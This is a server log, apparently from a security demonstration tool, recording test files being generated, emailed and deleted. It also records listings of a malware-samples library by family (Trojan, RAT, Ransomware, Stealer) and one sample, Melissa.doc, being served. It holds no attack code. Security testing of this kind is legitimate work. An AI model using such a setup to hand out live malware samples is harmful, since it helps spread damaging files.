2025-01-22 13:11:26 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 13:11:26 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_4680.pdf' deleted from filesystem.
2025-01-22 13:11:26 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 13:11:26 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:11:26 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 13:11:26 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:11:54 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_6643.pdf
2025-01-22 13:11:54 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_6643.pdf' saved successfully.
2025-01-22 13:11:54 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 13:11:54 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 13:11:54 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:11:54 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 13:11:54 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:11:56 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_6643.pdf with MIME type: application/pdf
2025-01-22 13:12:35 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 13:12:35 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 13:12:35 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 13:12:35 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_6643.pdf' deleted from filesystem.
2025-01-22 13:12:35 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 13:12:35 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:12:35 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 13:12:35 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:20:30 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_jpg_file_6407.jpg
2025-01-22 13:20:30 - INFO - save_generated_file_to_db:455 - Generated file 'generated_jpg_file_6407.jpg' saved successfully.
2025-01-22 13:20:30 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 13:20:30 - INFO - generate:425 - File of type 'jpg' generated successfully.
2025-01-22 13:20:30 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:20:30 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 13:20:30 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:20:32 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-22 13:20:32 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:20:32 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 13:20:32 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:31:13 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_jpg_file_6407.jpg
2025-01-22 13:31:13 - INFO - delete_generated_file:564 - File 'generated_jpg_file_6407.jpg' deleted from database.
2025-01-22 13:31:13 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-22 13:31:13 - INFO - delete_generated_file:578 - File 'generated_jpg_file_6407.jpg' deleted from filesystem.
2025-01-22 13:31:13 - INFO - delete_file:297 - Deleted file: generated_jpg_file_6407.jpg
2025-01-22 13:31:13 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:31:13 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 13:31:13 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:31:23 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_rtf_file_2791.rtf
2025-01-22 13:31:23 - INFO - save_generated_file_to_db:455 - Generated file 'generated_rtf_file_2791.rtf' saved successfully.
2025-01-22 13:31:23 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 13:31:23 - INFO - generate:425 - File of type 'rtf' generated successfully.
2025-01-22 13:31:23 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:31:23 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 13:31:23 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:31:24 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_rtf_file_2791.rtf with MIME type: application/rtf
2025-01-22 13:31:29 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-22 13:31:29 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:31:29 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 13:31:29 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:41:19 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 13:41:19 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 13:41:19 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 13:41:19 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_2258.jpg' deleted from filesystem.
2025-01-22 13:41:19 - INFO - delete_all_generated_files:613 - File 'generated_rtf_file_2791.rtf' deleted from filesystem.
2025-01-22 13:41:19 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 13:41:19 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:41:19 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 13:41:19 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:56:27 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_4459.docx
2025-01-22 13:56:27 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_4459.docx' saved successfully.
2025-01-22 13:56:27 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 13:56:27 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 13:56:27 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:56:27 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 13:56:27 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:56:29 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_4459.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 14:05:05 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-22 14:05:05 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 14:05:05 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 14:05:05 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 14:07:20 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 14:07:20 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 14:07:20 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 14:07:20 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_9910.jpg' deleted from filesystem.
2025-01-22 14:07:20 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_4459.docx' deleted from filesystem.
2025-01-22 14:07:20 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 14:07:20 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 14:07:20 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 14:07:20 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 14:07:27 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_8801.pdf
2025-01-22 14:07:27 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_8801.pdf' saved successfully.
2025-01-22 14:07:27 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 14:07:27 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 14:07:27 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 14:07:27 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 14:07:27 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 14:07:30 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_8801.pdf with MIME type: application/pdf
2025-01-22 14:07:37 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-22 14:07:37 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 14:07:37 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 14:07:37 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 14:27:36 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 14:27:36 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 14:27:36 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 14:27:36 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_8801.pdf' deleted from filesystem.
2025-01-22 14:27:36 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 14:27:36 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 14:27:36 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 14:27:36 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 14:29:03 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_6020.pdf
2025-01-22 14:29:03 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_6020.pdf' saved successfully.
2025-01-22 14:29:03 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 14:29:03 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 14:29:03 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 14:29:03 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 14:29:03 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 14:29:05 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_6020.pdf with MIME type: application/pdf
2025-01-22 14:29:48 - INFO - dir_listing:234 - Resolved absolute path: /home/kali/Desktop/cp_demo_server/app/data/malware_samples
2025-01-22 14:29:48 - DEBUG - dir_listing:263 - Files and directories: [{'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}, {'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}]
2025-01-22 14:29:54 - INFO - dir_listing:234 - Resolved absolute path: /home/kali/Desktop/cp_demo_server/app/data/malware_samples/Virus
2025-01-22 14:29:54 - DEBUG - dir_listing:263 - Files and directories: [{'name': 'MadMan.exe', 'path': 'Virus/MadMan.exe', 'is_file': True}, {'name': 'Gnil.exe', 'path': 'Virus/Gnil.exe', 'is_file': True}, {'name': 'Xpaj', 'path': 'Virus/Xpaj', 'is_file': False}, {'name': 'WinNuke.98.exe', 'path': 'Virus/WinNuke.98.exe', 'is_file': True}, {'name': 'Floxif.exe', 'path': 'Virus/Floxif.exe', 'is_file': True}, {'name': 'Mabezat.exe', 'path': 'Virus/Mabezat.exe', 'is_file': True}, {'name': 'Melissa.doc', 'path': 'Virus/Melissa.doc', 'is_file': True}, {'name': 'Walker.com', 'path': 'Virus/Walker.com', 'is_file': True}]
2025-01-22 14:29:57 - INFO - dir_listing:234 - Resolved absolute path: /home/kali/Desktop/cp_demo_server/app/data/malware_samples/Virus/Melissa.doc
2025-01-22 14:29:57 - INFO - dir_listing:242 - Sending file: /home/kali/Desktop/cp_demo_server/app/data/malware_samples/Virus/Melissa.doc
2025-01-24 11:05:57 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-24 11:05:57 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-24 11:05:57 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-24 11:06:00 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-24 11:06:00 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-24 11:06:00 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-24 11:06:04 - INFO - dir_listing:234 - Resolved absolute path: /home/kali/Desktop/cp_demo_server/app/data/malware_samples
2025-01-24 11:06:04 - DEBUG - dir_listing:263 - Files and directories: [{'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}, {'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}]
2025-01-24 11:06:06 - INFO - dir_listing:234 - Resolved absolute path: /home/kali/Desktop/cp_demo_server/app/data/malware_samples
2025-01-24 11:06:06 - DEBUG - dir_listing:263 - Files and directories: [{'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}, {'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}]
2025-01-24 11:06:07 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-24 11:06:07 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-24 11:06:07 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-24 11:06:08 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-24 11:06:08 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-24 11:06:08 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-24 11:06:09 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-24 11:06:09 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-24 11:06:09 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-24 11:06:09 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_6020.pdf' deleted from filesystem.
2025-01-24 11:06:09 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_6837.jpg' deleted from filesystem.
2025-01-24 11:06:09 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-24 11:06:09 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-24 11:06:09 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-24 11:06:09 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-24 11:06:26 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-24 11:06:26 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-24 11:06:26 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-24 11:06:27 - INFO - dir_listing:234 - Resolved absolute path: /home/kali/Desktop/cp_demo_server/app/data/malware_samples
2025-01-24 11:06:27 - DEBUG - dir_listing:263 - Files and directories: [{'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}, {'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}]
2025-01-24 11:06:28 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-24 11:06:28 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-24 11:06:28 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-24 11:06:40 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-24 11:06:40 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-24 11:06:40 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:20:44 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:20:44 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:20:45 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:20:45 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:20:45 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:20:45 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:20:45 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:20:45 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:20:45 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:20:45 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:20:45 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:20:45 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 16:20:45 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:20:45 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:20:45 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:20:50 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:20:50 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:20:50 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:20:50 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:20:50 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:20:50 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:20:50 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:20:50 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:20:50 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:20:50 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:20:50 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:20:50 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 16:20:50 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:20:50 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:20:50 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:24:49 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:24:49 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:24:49 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:24:49 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:24:49 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:24:49 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:24:49 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:24:49 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:24:49 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:24:49 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:24:49 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:24:49 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 16:24:49 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:24:49 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:24:49 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:24:55 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:24:55 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:24:55 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:24:55 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:24:55 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:24:55 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:24:55 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:24:55 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:24:55 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:24:55 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:24:55 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:24:55 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 16:24:55 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:24:55 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:24:55 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:25:15 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:25:15 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:25:15 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:25:18 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:25:21 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:25:21 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:25:21 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:29:43 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:29:43 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:29:43 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:29:43 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:29:43 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:29:43 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:29:43 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:29:43 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:29:43 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:29:43 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:29:43 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:29:43 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 16:29:43 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:29:43 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:29:43 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:29:48 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:29:48 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:29:48 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:29:48 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:29:48 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:29:48 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:29:48 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:29:48 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:29:48 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:29:48 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:29:48 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:29:49 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 16:29:49 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:29:49 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:29:49 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:30:47 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:30:47 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:30:47 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:30:55 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:30:55 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:30:55 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:31:02 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:31:02 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:31:02 - DEBUG - load_protections:349 - Database connection closed after load_protections.
